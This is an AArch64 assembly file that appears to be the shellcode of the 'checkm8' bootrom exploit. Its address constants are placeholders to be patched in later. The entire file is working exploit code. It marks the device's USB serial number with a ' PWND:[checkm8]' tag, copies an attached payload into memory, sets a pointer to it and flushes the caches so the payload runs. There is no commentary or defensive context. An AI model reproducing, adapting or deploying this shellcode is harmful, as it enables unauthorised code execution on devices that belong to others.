.text

.pool
.set PAYLOAD_OFFSET,               0xBAD00006
.set PAYLOAD_SIZE,                 0xBAD00007
.set PAYLOAD_DEST,                 0xBAD00005
.set PAYLOAD_PTR,                  0xBAD00008
.set gUSBSerialNumber,             0xBAD00002
.set gUSBSRNMStringDescriptor,     0xBAD00004
.set gUSBDescriptors,              0xBAD00001
.set usb_create_string_descriptor, 0xBAD00003

.global _main
_main:
  MOV  X19, #0                      // HACK: do not free this usb request
  STP  X29, X30, [SP,#-0x10]!
  MOV  X29, SP

  LDR  X0, =gUSBDescriptors
  LDP  X0, X1, [X0]
  ADR  X2, USB_DESCRIPTOR
  LDP  X3, X4, [X2]
  LDP  X3, X4, [X2,#0x10]

  LDR  X0, =gUSBSerialNumber
find_zero_loop:
  ADD  X0, X0, #1
  LDRB W1, [X0]
  CBNZ W1, find_zero_loop

  ADR  X1, PWND_STRING
  LDP  X2, X3, [X1]
  STP  X2, X3, [X0]

  LDR  X0, =gUSBSerialNumber
  LDR  X1, =usb_create_string_descriptor
  BLR  X1

  LDR  X1, =gUSBSRNMStringDescriptor
  STRB W0, [X1]

  LDR  X0, =PAYLOAD_DEST
  ADR  X1, _main
  LDR  X2, =PAYLOAD_OFFSET
  ADD  X1, X1, X2
  MOV  X2, #0
  LDR  X3, =PAYLOAD_SIZE
  LDR  X4, =PAYLOAD_PTR
  ADD  X5, X0, #0x18
  STR  X5, [X4]

copy_loop:
  LDP  X3, X4,  [X1]
  STP  X3, X4,  [X0]
  LDP  X3, X4,  [X1,#0x10]
  STP  X3, X4,  [X0,#0x10]
  LDP  X3, X4,  [X1,#0x20]
  STP  X3, X4,  [X0,#0x20]
  LDP  X3, X4,  [X1,#0x30]
  STP  X3, X4,  [X0,#0x30]
  DC   CIVAC, X0
  DMB  SY
  ADD  X0, X0, #0x40
  ADD  X1, X1, #0x40
  ADD  X2, X2, #0x40
  CMP  X2, X3
  B.CC copy_loop

  SYS  #0, c7, c5, #0
  DSB  SY
  ISB

  LDP  X29, X30, [SP],#0x10
  RET

USB_DESCRIPTOR:
.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0

PWND_STRING:
.asciz " PWND:[checkm8]"
